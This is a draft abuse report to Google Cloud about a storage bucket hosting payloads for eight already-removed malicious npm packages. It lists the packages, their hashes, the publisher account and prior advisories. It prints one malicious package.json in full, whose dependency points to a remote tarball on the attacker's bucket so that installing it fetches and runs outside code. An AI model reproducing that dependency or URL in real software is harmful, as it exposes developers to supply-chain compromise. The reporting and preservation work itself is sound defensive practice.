# `ltidi.storage.googleapis.com` — an active PhantomRaven-family payload host

**Status:** prepared, not sent.
**Intended recipient:** Google Cloud abuse. *Not* npm security, and *not* GHSA or
OSV — see "Already reported" below.
**Prepared:** 2026-08-21, revised the same day after a prior-art check.
**Reporter:** norte-guard (npm publish-stream collector), engine v1.4.0

---

## This is not a new finding

The technique is **PhantomRaven**, published by Koi Security in October 2025 as
*Remote Dynamic Dependencies*: a near-empty npm package whose `package.json`
points its only dependency at an HTTP(S) tarball URL instead of a registry range,
so that `npm install` fetches and runs attacker-controlled code from a host the
registry never saw. Koi documented 126 packages; Sonatype found 83 more.

Socket ships a detection rule for the shape — the `HTTP Dependency` alert, High
severity.

**The eight packages below were already reported before this project analysed
them.** They carry OSV records with GHSA aliases, sourced from Amazon Inspector
and OSSF Package Analysis. The Amazon Inspector advisory for `gunzip-js` was
published on 2026-08-15 at 15:31 UTC — about one hour after this collector
captured the package — and already named the bucket, the `depenconf` path, the
`99.9.1` version squat and the empty `index.js`.

This report therefore claims nothing about the technique and nothing about the
packages. It exists for one reason: **the npm side was remediated and the hosting
side may not have been.**

---

## What is being reported

npm removed all eight packages. That removal reaches what npm hosts. The
executable payload is an object in a Google Cloud Storage bucket, which npm
cannot remove.

Requested:

1. Review of the bucket `ltidi` under Google Cloud's abuse policy.
2. If action is taken, **preservation** of the objects under `depenconf/`, since
   the advisories describe them but no public source appears to hold the
   artifacts.

```
https://ltidi.storage.googleapis.com/depenconf/ltidisafe-<version>.tgz
```

Bucket `ltidi`, path prefix `depenconf/`, eight referenced object versions:
`3.6.1`, `3.6.3`, `3.6.5`, `3.6.6`, `3.6.7`, `3.7.2`, `3.7.3`, `3.7.4`.

**The bucket was not probed.** No request of any kind was made to it. Whether the
objects are still present is unknown to this reporter, and stating so is more
useful than a guess.

---

## Already reported — do not treat as new

| package | version | OSV | published |
|---|---|---|---|
| `check-audit` | 99.9.1 | MAL-2026-13976 | 2026-08-15 |
| `cspell-esm` | 99.9.1 | MAL-2026-13977 | 2026-08-15 |
| `eslint-generate-release` | 99.9.1 | MAL-2026-13980 | 2026-08-15 |
| `napi-raw` | 99.9.1 | MAL-2026-13984 | 2026-08-15 |
| `resolve-audit` | 99.9.1 | MAL-2026-13987 | 2026-08-15 |
| `depcruise-baseline` | 99.9.1 | MAL-2026-14053 | 2026-08-15 |
| `depcruise-fmt` | 99.9.1 | MAL-2026-14054 | 2026-08-15 |
| `gunzip-js` | 99.9.1 | MAL-2026-14056 | 2026-08-15 (GHSA-2hqf-5jxh-4wp2) |

Sources on those records: `amazon-inspector`, `ossf-package-analysis`,
`ghsa-malware`.

---

## Artifacts held, offered on request

The one thing here that may not exist elsewhere. Each package was captured
directly from `registry.npmjs.org` within 8–20 seconds of publication, before
removal, and the tarballs have been held offline since.

| package | captured (UTC) | sha256 of the tarball as fetched |
|---|---|---|
| `napi-raw` | 2026-08-13 05:17:19 | `54568c5a8a2e5dec9cf77154f6b58f854c5215c044f03d98dfb31a804d204cc3` |
| `eslint-generate-release` | 2026-08-13 05:21:07 | `4f5dec13327d76a9fd5a6cc98a07e998b0b583be6ecbaa8e329dcfa3c175b8ff` |
| `check-audit` | 2026-08-13 05:23:43 | `118da10905f3b62cf2b5a640ce55619fbb3c863cc639e57dfecac8ecf7b3e75a` |
| `resolve-audit` | 2026-08-13 05:24:39 | `3c57b0807253dab100c4abfd0b6b11987d1835e0e281bb283d400430d475e7e3` |
| `cspell-esm` | 2026-08-13 05:25:40 | `e37c6a8ba58871aff90e39c81bfbfc98d0e4013d6f6a9c70a7a373b184c8b512` |
| `gunzip-js` | 2026-08-15 14:27:57 | `1a0891248b169baac930fc59852c97742328e81c961ffb92caa0f3878b178595` |
| `depcruise-fmt` | 2026-08-15 14:30:55 | `f555c94f59ba18a05bb37c6089f57f3ab27d6bc5246ce00b476ae68179c5b486` |
| `depcruise-baseline` | 2026-08-15 14:31:39 | `693eaf0681a58724a97504cab3ad2c25149b61327ae9e1eecc6485006d4e05b0` |

Each is two files. `gunzip-js@99.9.1` in full:

```js
// package/index.js — 35 bytes
'use strict';
module.exports = {};
```

```json
// package/package.json — 317 bytes
{
  "name": "gunzip-js", "version": "99.9.1", "description": "", "main": "index.js",
  "scripts": { "test": "echo \"Error: no test specified\" && exit 1" },
  "dependencies": { "ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.2.tgz" },
  "author": "", "license": "ISC"
}
```

Publication timestamps, packuments and change-feed records for all eight are
available alongside them.

All eight were published by the npm account `whltd4`, per `_npmUser` on each
version. Five on 2026-08-13 between 05:17 and 05:25; three on 2026-08-15 between
14:27 and 14:31.

---

## One measurement, offered as context rather than as a finding

Over a sample of 25,394 publications from the npm change feed covering 13,344
distinct package names, 42 names (0.315%) declare a dependency that is not a
registry range. Grouped as `(publishing operator, destination)` pairs there are
33, of which **30 hold one package name, two hold two, and one holds eight** —
the `ltidi` bucket.

Every ordinary use in the sample is roughly one name per operator: `file:` links,
`github:` shorthand, and a vendor that distributes off-registry deliberately.

This is offered because the concentration, rather than the presence, is what
distinguished this case, and because Socket has published the same idea applied
to a shared exfiltration webhook rather than a shared dependency host. It rests
on a single campaign and on a collector whose capture filter makes the sample an
enriched one, so it is context and not a claim.

---

## Limits

- **`ltidisafe` was never fetched.** No claim is made about its contents,
  behaviour, or present existence.
- The 0.315% figure describes this collector's filtered sample of the publish
  stream, not npm as a whole.
- The technique, the detection rule for it, and these eight packages are all
  previously published. See `docs/prior-art.md` in this repository.

---

## Contact

Prepared by the norte-guard project. Captured artifacts and records available to
the recipient on request.
